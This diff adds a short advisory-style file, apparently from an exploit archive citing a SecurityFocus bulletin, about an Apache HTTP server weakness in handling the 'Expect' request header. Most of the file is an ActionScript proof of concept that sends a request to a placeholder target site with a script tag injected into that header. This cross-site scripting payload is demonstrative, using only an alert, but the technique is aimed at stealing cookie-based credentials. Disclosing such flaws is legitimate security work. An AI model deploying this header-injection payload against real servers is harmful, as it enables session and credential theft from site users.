@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/19661/info
+
+Apache HTTP server is prone to a security weakness related to HTTP request headers.
+
+An attacker may exploit this issue to steal cookie-based authentication credentials and launch other attacks.
+
+var req:LoadVars=new LoadVars();
+req.addRequestHeader("Expect",
+"<script>alert('gotcha!')</script>");
+req.send("http://www.target.site/","_blank","GET");
